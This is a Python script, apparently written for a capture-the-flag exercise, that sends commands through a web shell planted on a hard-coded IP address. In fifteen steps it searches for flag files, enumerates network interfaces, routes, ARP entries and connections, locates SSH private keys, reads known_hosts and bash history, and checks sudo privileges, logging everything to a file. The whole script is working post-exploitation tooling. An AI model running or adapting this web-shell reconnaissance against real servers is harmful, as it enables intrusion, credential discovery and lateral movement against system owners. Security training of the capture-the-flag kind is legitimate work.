#!/usr/bin/env python3
"""
Investigação Completa Automática - Parte 1 CTF9
Busca Flag 4 e todas as informações necessárias
"""

import requests
import urllib.parse
import sys
import time

TARGET = "44.197.173.254"
WEBSHELL = f"http://{TARGET}/shell.php"
OUTPUT_FILE = "resultados_completos.txt"

def execute_command(cmd, timeout=15):
    """Executa comando via webshell"""
    try:
        encoded_cmd = urllib.parse.quote(cmd)
        url = f"{WEBSHELL}?cmd={encoded_cmd}"
        response = requests.get(url, timeout=timeout)
        return response.text.strip()
    except Exception as e:
        return f"ERRO: {e}"

def save_result(section, result):
    """Salva resultado em arquivo"""
    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"{section}\n")
        f.write(f"{'='*60}\n")
        f.write(f"{result}\n")
    print(f"✅ {section} - Salvo em {OUTPUT_FILE}")

def main():
    print("=" * 60)
    print("INVESTIGAÇÃO AUTOMÁTICA COMPLETA - PARTE 1 CTF9")
    print(f"Alvo: {TARGET}")
    print(f"Resultados serão salvos em: {OUTPUT_FILE}")
    print("=" * 60)
    print()
    
    # Limpar arquivo anterior
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write(f"Investigacao Completa - {TARGET}\n")
        f.write(f"Data: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    # 1. Teste inicial
    print("[1/15] Testando webshell...")
    result = execute_command("whoami")
    print(f"   Resultado: {result}")
    save_result("[1] TESTE WEBSHELL", result)
    time.sleep(1)
    
    # 2. Busca flags
    print("[2/15] Buscando arquivos com 'flag'...")
    result = execute_command("find / -name '*flag*' -type f 2>/dev/null", timeout=30)
    print(f"   Encontrados: {len(result.split())} resultados")
    save_result("[2] BUSCA FLAGS", result)
    time.sleep(1)
    
    # 3. Busca LightBringers
    print("[3/15] Buscando LightBringers...")
    result = execute_command("find / -name '*LightBringers*' -o -name '*lightbringers*' 2>/dev/null", timeout=30)
    print(f"   Encontrados: {len(result.split())} resultados")
    save_result("[3] BUSCA LIGHTBRINGERS", result)
    time.sleep(1)
    
    # 4. Busca solyd em arquivos
    print("[4/15] Buscando 'solyd' em arquivos...")
    result = execute_command("grep -r 'solyd' /home /var/www /opt /tmp 2>/dev/null | head -50", timeout=30)
    print(f"   Encontrados: {len(result.split('\\n'))} linhas")
    save_result("[4] BUSCA SOLYD", result)
    time.sleep(1)
    
    # 5. Interfaces de rede
    print("[5/15] Verificando interfaces de rede...")
    result = execute_command("ip a")
    save_result("[5] INTERFACES REDE", result)
    time.sleep(1)
    
    # 6. Rotas
    print("[6/15] Verificando rotas...")
    result = execute_command("ip route")
    save_result("[6] ROTAS", result)
    time.sleep(1)
    
    # 7. ARP cache
    print("[7/15] Verificando ARP cache...")
    result = execute_command("arp -a")
    save_result("[7] ARP CACHE", result)
    time.sleep(1)
    
    # 8. Conexões estabelecidas
    print("[8/15] Verificando conexões estabelecidas...")
    result = execute_command("ss -antp | grep ESTABLISHED")
    save_result("[8] CONEXOES ESTABELECIDAS", result)
    time.sleep(1)
    
    # 9. Todas as conexões
    print("[9/15] Verificando todas as conexões...")
    result = execute_command("ss -antp")
    save_result("[9] TODAS CONEXOES", result)
    time.sleep(1)
    
    # 10. Chaves SSH
    print("[10/15] Buscando chaves SSH...")
    result = execute_command("find / -name 'id_rsa*' 2>/dev/null", timeout=30)
    save_result("[10] CHAVES SSH", result)
    time.sleep(1)
    
    # 11. Known hosts
    print("[11/15] Verificando known_hosts...")
    result = execute_command("cat ~/.ssh/known_hosts 2>/dev/null; cat /home/*/.ssh/known_hosts 2>/dev/null")
    save_result("[11] KNOWN HOSTS", result)
    time.sleep(1)
    
    # 12. Histórico bash
    print("[12/15] Verificando histórico bash...")
    result = execute_command("cat ~/.bash_history 2>/dev/null")
    save_result("[12] HISTORICO BASH", result)
    time.sleep(1)
    
    # 13. Processos suspeitos
    print("[13/15] Verificando processos...")
    result = execute_command("ps aux | grep -E 'ssh|socat|nc|tunnel' | grep -v grep")
    save_result("[13] PROCESSOS SUSPEITOS", result)
    time.sleep(1)
    
    # 14. Diretórios específicos
    print("[14/15] Verificando diretórios específicos...")
    result = execute_command("ls -la /opt/ /tmp/ /var/log/ 2>/dev/null")
    save_result("[14] DIRETORIOS ESPECIFICOS", result)
    time.sleep(1)
    
    # 15. Verificar usuário atual e privilégios
    print("[15/15] Verificando usuário e privilégios...")
    result = execute_command("whoami; id; sudo -l 2>/dev/null")
    save_result("[15] USUARIO E PRIVILEGIOS", result)
    
    print()
    print("=" * 60)
    print("✅ INVESTIGAÇÃO CONCLUÍDA!")
    print(f"📄 Resultados salvos em: {OUTPUT_FILE}")
    print("=" * 60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n⚠️ Investigação interrompida pelo usuário")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ ERRO: {e}")
        sys.exit(1)
